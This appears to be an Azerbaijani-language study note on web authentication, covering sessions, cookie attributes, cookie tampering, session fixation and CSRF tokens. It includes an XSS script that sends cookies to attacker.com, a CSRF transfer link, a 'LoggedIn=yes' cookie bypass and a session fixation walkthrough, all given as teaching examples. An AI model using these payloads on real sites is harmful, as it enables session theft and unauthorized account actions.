## AUTH Tipləri:
1) *Password-based* – Universitet portalına hər dəfə username və şifrə yazaraq daxil olursan.

2) *MFA* – Bank hesabına girişdə şifrəni yazırsan, sonra telefonuna gələn SMS kodu təsdiqləyirsən.

3) *Token-based* – Mobil tətbiqdə login edirsən, server sənə token verir və tətbiq hər sorğuda onu göndərir.

4) *Session-based* – Onlayn mağazaya login olandan sonra səhifələri dəyişsən də çıxış olmursan.

5) *Certificate-based* – İş yerinin daxili şəbəkəsinə yalnız sənə verilmiş sertifikatla qoşula bilirsən.

6) *Biometric* – Telefon kilidini üz tanıma ilə açırsan.

7) *SSO* – İş sisteminə bir dəfə login olub e-mail, HR və daxili portalı ayrıca girişsiz açırsan.

<img width="798" height="572" alt="image" src="https://github.com/user-attachments/assets/e758417b-6823-42ea-b4e9-6e78bd0c8246" />

#### CVE‑2020‑15906 – Tiki Wiki CMS‑də admin hesabı çox yalnış loginlə kilidləndikdən sonra boş şifrə ilə autentifikasiyanın ötürülməsinə imkan verən auth bypass zəifliyidir.

#### https://www.exploit-db.com/exploits/39167 - Bu exploitdə auth bypass ona görə baş verir ki, tətbiq login olub‑olmadığını server‑side yoxlamaq əvəzinə yalnız $_COOKIE['LoggedIn'] dəyişəninə inanır; hücumçu request‑ə Cookie: LoggedIn=yes əlavə etməklə heç bir username/password olmadan admin panelə daxil olur.

## Session, SessionID və Cookie
İstifadəçi login olduqda server backend‑də (məs: PHP, Java, Node) session object yaradır və onu server‑side storage‑da (RAM, Redis, DB) saxlayır; brauzerə isə yalnız SessionID göndərilir (cookie kimi). Hər HTTP request‑də server SessionID‑ni oxuyur, uyğun session‑u tapır və istifadəçinin rolunu, auth statusunu, CSRF tokenini, vaxtını və s. yoxlayır.
Yəni,

İstifadəçi uğurla login olduqda, server server‑side session yaradır, bu session üçün unikal və təsadüfi SessionID generasiya edir, session məlumatlarını (user_id, auth=true, role, expiry və s.) server‑də saxlayır və yalnız həmin SessionID‑ni cookie kimi brauzerə göndərir; brauzer bu cookie‑ni saxlayır və sonrakı hər HTTP request‑də avtomatik göndərdiyi üçün server SessionID‑yə əsasən istifadəçini tanıyır və yenidən login tələb etmir.

## HTTP-ONLY
*HttpOnly* – cookie atributudur; brauzerin JavaScript vasitəsilə həmin cookieni oxumasına mane olur, yalnız HTTP sorğularında (serverə göndərilərkən) istifadə olunur, bu da XSS hücumlarından cookie oğurlanmasının qarşısını alır.

Tutaq ki, sənin brauzerində session cookie var.Əgər HttpOnly YOXDURSA, saytda olan bir JavaScript bunu oxuya bilər:
document.cookie
→ hücumçu XSS ilə sessiyanı oğurlayar.

Əgər HttpOnly VARSA, JavaScript heç cür bu cookieni görə bilməz ❌

amma brauzer yenə də onu serverə avtomatik göndərir ✅

*Qısaca desək:*
HttpOnly = cookie yalnız server üçündür, JS üçün qadağandır.

*HttpOnly YOXDURSA*

Hücumçu stored XSS yerləşdirir:

```<script>
fetch("https://attacker.com/?c=" + document.cookie)
</script>
```

Admin/user səhifəni açır
Brauzer session cookie-ni JS-ə verir

## Session Hijacking 

<img width="245" height="426" alt="image" src="https://github.com/user-attachments/assets/01150f1f-877d-426b-ae54-135fc6060a38" />


*HttpOnly VARSA*

Eyni stored XSS işləyir

document.cookie → SESSION GÖRÜNMÜR

Hücumçu cookie-ni oğurlaya bilmir
Session təhlükəsiz qalır
Cookie hücumçuya gedir
Hücumçu session hijacking edir → login olmadan daxil olur

*DİQQƏT*: HttpOnly XSS-i bloklamır. Amma session oğurluğunu bloklayır

*Simulyasiya:*

HTTP = poçtalyon

JS = evin içindəki uşaq

HttpOnly = “poçtu poçtalyon versin, uşağa yox”

## SameSite

SameSite cookie atributudur və brauzerə deyir ki, bu cookie hansı hallarda HTTP request‑ə əlavə olunsun. Brauzer cookie‑ləri avtomatik göndərir.
Əgər istifadəçi bir sayta login olubsa, başqa sayt həmin istifadəçinin brauzeri vasitəsilə həmin sayta request göndərə bilər.

*Ssenari*

İstifadəçi bank.com‑da login olub
Brauzerdə session cookie var

```Cookie: SESSION=abc123```


Sonra istifadəçi başqa saytda belə link görür:

```
<a href="https://bank.com/transfer?to=attacker&amount=1000">
  Endirim üçün klik et
</a>
```
<a href="https://bank.com/transfer?to=attacker&amount=1000">
  Endirim üçün klik et
</a>

İstifadəçi klikləyir ✅

*Əgər SameSite YOXDURSA*

Brauzer SESSION=abc123 cookie‑sini bank.com‑a göndərir. Server istifadəçini login olmuş hesab edir. Pul köçürülür. Bu CSRF hücumudur.

*Əgər SameSite varsa*

Request başqa saytdan gəldiyi üçün brauzer cookie‑ni göndərmir.Əməliyyat icra olunmur ❌

*VACİB*: HttpOnly və SameSite request‑də görünməz, yalnız serverin Set‑Cookie response‑unda olur və brauzer bu qaydaları səssizcə tətbiq edir.

*Qısaca*: HttpOnly cookie-nin yalnız HTTP request-lərdə istifadə olunmasını (JS-dən gizlədilməsini), SameSite isə onun hansı HTTP request-lərə əlavə olunacağını müəyyən edir.

## Secure

Cookie yalnız HTTPS üzərindən göndərilir

HTTP-də GETMİR ❌
```
Set-Cookie: SESSION=abc123; Secure
```

## Path

Cookie yalnız müəyyən URL path-lərdə göndərilir

```
Set-Cookie: SESSION=abc123; Path=/admin
```

## Cookie tampering 

Cookie tampering testi serverin session və səlahiyyətləri server-side yox, client-side cookie-yə əsasən idarə edib-etmədiyini aşkar edir. Pentester brauzerdən/serverdən gələn cookie-ləri (məs: role=user, LoggedIn=false, user_id=12) əl ilə dəyişir və serverin bunu yenidən yoxlayıb-yoxlamadığını test edir.

#### OPTIONS request — HTTP metodudur və serverdən soruşur: “Bu endpoint hansı HTTP metodlarını və qaydaları dəstəkləyir?”

OPTIONS = “Bu endpointə nə edə bilərəm?” sorğusudur.

## Session Fixation 

<img width="381" height="440" alt="image" src="https://github.com/user-attachments/assets/894c5da4-a012-4b92-bb3c-23ed1daad92f" />

Hücumçunun əvvəlcədən təyin etdiyi session ID ilə istifadəçini login etdirməsi və həmin ID dəyişmədiyi üçün sonradan onun sessiyasını ələ keçirməsidir.

Session fixation üçün istifadəçi hücumdan ƏVVƏL login olmamış olmalıdır ki, hücumçu əvvəlcədən verdiyi session ID login zamanı dəyişdirilməsin.

Session Fixation hucum simulyasiyasi:

1️⃣ Hücumçu (Joe) əvvəlcədən bir Session ID seçir

``` SID=1000 ```

2️⃣ Joe qurbana (Jane) saxta bank emaili göndərir və linkə SID əlavə edir

``` https://bank.com/login?SID=1000 ```


3️⃣ Jane linkə klikləyir və login olur
```
username: jane
password: tarzan
```

➡️ Server yeni session yaratmır, köhnə SID=1000 qalır

4️⃣ Joe eyni SID ilə sayta girir

``` https://bank.com/account?SID=1000 ```

5️⃣ 🎯 Server Joe-nu Jane kimi tanıyır

Nəticə

✔️ Joe Jane-in hesabına parolsuz daxil olur

❌ Səbəb: Session ID URL-dədir və login zamanı dəyişdirilmir

Netice olaraq:Session ID heç vaxt URL-də olmamalı və login zamanı yenilənməlidir.

Müasir dövrdə bu hücumun həyata keçirilməsi demək olar ki, mümkün deyil. Çünki, serverlər ümumiyyətlə istifadəçini login etmədən əvvəl və sonra sessiya ID-lərini dəyişdirir


#### Bearer Authentication - Server yalnız tokenin özünü yoxlayır. Request-i göndərən tərəfin tokeni sahiblənməsini ayrıca sübut etməsi tələb olunmur. Yeni bu tokeni gonderdikde yoxlamirki kim gonderib sadece tokenin serverde valid olub-olmamasini yoxlayir. Yəni auth qərarı belə verilir:

IF token is valid

   THEN allow request
   
❌ IP

❌ Device

❌ Extra cryptographic proof yoxdur.

#### CSRF token — login sonrası server tərəfindən yaradılan, session‑a bağlı unikal dəyərdir və POST/PUT/DELETE request-lərdə server tərəfindən yoxlanır, uyğun deyilsə request rədd olunur. Yəni sayt bilsin ki, əməliyyatı sən öz brauzerindən icra etmisən, kimsə gizlicə sənin adından göndərə bilməz. Ssenari:

Login olursan → server unikal session yaradır və session-a bağlı CSRF token təyin edir → hər POST/PUT/DELETE request-də client tokeni göndərir → server tokeni session-dakı token ilə müqayisə edir → uyğun deyilsə request rədd olunur.
